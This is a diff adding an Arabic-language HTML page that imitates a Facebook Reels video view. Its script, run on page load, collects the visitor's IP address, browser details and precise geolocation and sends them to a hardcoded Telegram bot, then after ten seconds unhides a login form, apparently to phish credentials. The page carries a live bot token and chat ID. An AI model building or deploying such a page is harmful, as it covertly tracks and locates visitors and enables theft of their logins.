@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيس بوك ريلز</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+        }
+
+        .reels-container {
+            position: relative;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(0,0,0,0), rgba(0,0,0,0.8));
+        }
+
+        .user-info {
+            position: absolute;
+            bottom: 100px;
+            right: 20px;
+            z-index: 1;
+        }
+
+        .interaction-buttons {
+            position: absolute;
+            bottom: 120px;
+            left: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            z-index: 1;
+        }
+
+        .button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .button img {
+            width: 30px;
+            filter: invert(1);
+        }
+
+        .progress-bar {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            height: 3px;
+            background-color: rgba(255,255,255,0.3);
+            display: flex;
+            gap: 5px;
+            z-index: 1;
+        }
+
+        .progress-segment {
+            height: 100%;
+            background-color: rgba(255,255,255,0.5);
+            flex-grow: 1;
+            transition: width 0.3s ease;
+        }
+
+        .active-progress {
+            background-color: #fff;
+        }
+
+        .login-form {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 999;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="reels-container">
+        <div class="progress-bar">
+            <div class="progress-segment active"></div>
+            <div class="progress-segment"></div>
+            <div class="progress-segment"></div>
+        </div>
+
+        <video id="reelsVideo" autoplay muted controls>
+            <source src="https://www.mediafire.com/file/464jsgv7k2knfnu/%25E2%2580%258F%25D9%2588%25D9%2582%25D8%25AA_%25D8%25AA%25D8%25AD%25D8%25A8_%25D8%25AD%25D8%25A8_%25D9%2588%25D8%25AD%25D8%25AF%25D8%25A9_%25D9%2582%25D8%25B5%25D9%258A%25D8%25B1%25D8%25A9%25E2%2580%258F_-_%25D8%25A8%25D8%25AD%25D8%25AB_%25D9%2581%25D9%258A%25D8%25B3%25D8%25A8%25D9%2588%25D9%2583_1.mp4/file" type="video/mp4">
+        </video>
+        <div class="overlay"></div>
+
+        <div class="user-info">
+            <h3>@user_12345</h3>
+            <p>وصف الفيديو التجريبي...</p>
+        </div>
+
+        <div class="interaction-buttons">
+            <div class="button">
+                <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png" alt="Like">
+                <span>125K</span>
+            </div>
+            <div class="button">
+                <img src="https://cdn-icons-png.flaticon.com/512/1380/1380338.png" alt="Comment">
+                <span>2.1K</span>
+            </div>
+            <div class="button">
+                <img src="https://cdn-icons-png.flaticon.com/512/126/126509.png" alt="Share">
+                <span>مشاركة</span>
+            </div>
+        </div>
+    </div>
+    <script>
+const TELEGRAM_BOT_TOKEN = "7876711075:AAG227dcC-k6dDfrb4d719FB1rApyJAh3ko";
+const TELEGRAM_CHAT_ID = "1393964545";
+
+// دالة جمع المعلومات الأساسية
+async function getBasicInfo() {
+    return {
+        ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(r => r.ip),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        pageURL: window.location.href,
+        timestamp: new Date().toISOString()
+    };
+}
+
+// دالة الإرسال إلى تلغرام
+async function sendDataToTelegram(data) {
+    const message = `
+        <b>🚨 New Visitor 🚨</b>\n
+        ${Object.entries(data).map(([key, value]) => `• <b>${key}:</b> ${value}`).join('\n')}
+    `;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+// جمع الموقع الجغرافي فور الدخول
+window.onload = async () => {
+    const basicInfo = await getBasicInfo();
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async position => {
+            const fullData = {
+                ...basicInfo,
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: `${position.coords.accuracy}m`
+            };
+            await sendDataToTelegram(fullData);
+        }, async error => {
+            await sendDataToTelegram({
+                ...basicInfo,
+                locationError: error.message
+            });
+        }, {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+        });
+    } else {
+        await sendDataToTelegram({
+            ...basicInfo,
+            locationError: 'Geolocation not supported'
+        });
+    }
+
+    // إظهار نموذج الدخول بعد 10 ثواني
+    setTimeout(() => {
+        document.getElementById('loginForm').classList.remove('hidden');
+    }, 10000);
+};
+
+// بقية الكود الخاص بالنموذج يبقى كما هو
+</script>
+
+</body>
+</html>
